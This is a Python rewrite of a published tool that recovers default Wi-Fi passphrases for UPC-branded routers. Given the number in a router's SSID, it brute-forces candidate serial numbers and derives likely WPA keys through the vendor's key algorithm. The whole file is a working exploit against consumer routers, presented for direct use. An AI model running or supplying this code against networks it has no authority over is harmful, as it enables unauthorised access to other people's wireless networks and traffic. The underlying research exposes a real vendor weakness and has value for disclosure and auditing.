#!/usr/bin/env python

'''Everything in this file is a re-write of bl4sty's work on UPC keys.
The original can be found at https://haxx.in/upc_keys.c

As per https://haxx.in/LICENSE, including bl4sty's notice.
/*
 * ----------------------------------------------------------------------------
 * "THE BLASTY-WAREZ LICENSE" (Revision 1):
 * <peter@haxx.in> wrote this file. As long as you retain this notice and don't
 * sell my work you can do whatever you want with this stuff. If we meet some
 * day, and you think this stuff is worth it, you can intoxicate me in return.
 * ----------------------------------------------------------------------------
 */

The code below is a slightly more Pythonic rewrite of bl4sty's work
but the logic is mostly identical.

'''

import re
from hashlib import md5

UPC_REGEX = re.compile("UPC(\d{7})")

MAGIC_24GHZ = 0xffd9da60
MAGIC_5GHZ = 0xff8d8f20

MAGIC_24GHZ = -2500000
MAGIC_5GHZ = -7500000

MAGIC0 = 0xb21642c9
MAGIC1 = 0x68de3af
MAGIC2 = 0x6b5fca6b

#MAGIC0 = -1307163959
MAGIC1 = 109962159
MAGIC2 = 1801439851

MAX0 = 9
MAX1 = 99
MAX2 = 9
MAX3 = 9999

def chunks(l, n):
    # yoinked from
    # https://stackoverflow.com/questions/312443/how-do-you-split-a-list-into-evenly-sized-chunks-in-python
    """Yield successive n-sized chunks from l."""
    for i in xrange(0, len(l), n):
        yield l[i:i+n]

def hash2pass(in_hash):
    pass_list = []

    for in_char in chunks(in_hash[:16], 2):
        pass_char = int(in_char, 16) & 0x1f
        pass_char -= ((pass_char * MAGIC0) >> 36) * 23
        pass_char = (pass_char & 0xff) + 0x41

        if chr(pass_char) >= 'I':
            pass_char += 1
        if chr(pass_char) >= 'L':
            pass_char += 1
        if chr(pass_char) >= 'O':
            pass_char += 1

        pass_list.append(chr(pass_char))
    return "".join(pass_list)

def mangle(in_ints):

    a = ((in_ints[3] * MAGIC1) >> 40) - (in_ints[3] >> 31)
    b = (in_ints[3] - a * 9999 + 1) * 11
    c = in_ints[1] * 100 + in_ints[2] * 10 + in_ints[0]
    # We're limited to 32 bits here
    return (b * c) & 0xFFFFFFFF

def upc_generate_ssid(int_1, int_2, int_3, int_4, magic):
    a = int_2 * 10 + int_3
    b = (int_1 * 2500000)
    b += a * 6800
    b += int_4 + magic

    return b - (((b * MAGIC2) >> 54) - (b >> 31)) * 10000000;

def gen_upc_keys(target_int):

    '''Generate the serial and potential keys for a UPC int.

     target_int: an int containing the 7 UPC digits
    '''

    serial = ""
    phrases = []
    for int_1 in xrange(MAX0+1):
        for int_2 in xrange(MAX1+1):
            for int_3 in xrange(MAX2+1):
                for int_4 in xrange(MAX3+1):
                    test_24 = upc_generate_ssid(int_1, int_2, int_3, int_4, MAGIC_24GHZ)
                    test_5 = upc_generate_ssid(int_1, int_2, int_3, int_4, MAGIC_5GHZ)

                    if test_5 == target_int or test_24 == target_int:
                        serial = "SAAP%d%02d%d%04d" % (int_1, int_2, int_3, int_4)

                        serial_hash = md5(serial)
                        serial_hash_hex = serial_hash.hexdigest()

                        hash_list = []
                        for i in range(0, 16, 4):
                            hashchunk = serial_hash_hex[i+2:i+4]+serial_hash_hex[i:i+2]
                            hash_list.append(int(hashchunk, 16))

                        w1 = mangle(hash_list)

                        hash_list = []
                        for i in range(0, 16, 4):
                            hashchunk = serial_hash_hex[16+i+2:16+i+4]+serial_hash_hex[16+i:16+i+2]
                            hash_list.append(int(hashchunk, 16))

                        w2 = mangle(hash_list)

                        tmp_str = "%08X%08X" % (w1, w2)
                        tmp_hash = md5(tmp_str).hexdigest()
                        password = hash2pass(tmp_hash)
                        phrases.append(password)
    return serial, phrases

if __name__ == "__main__":

    target_int = 1337666
    print gen_upc_keys(target_int)
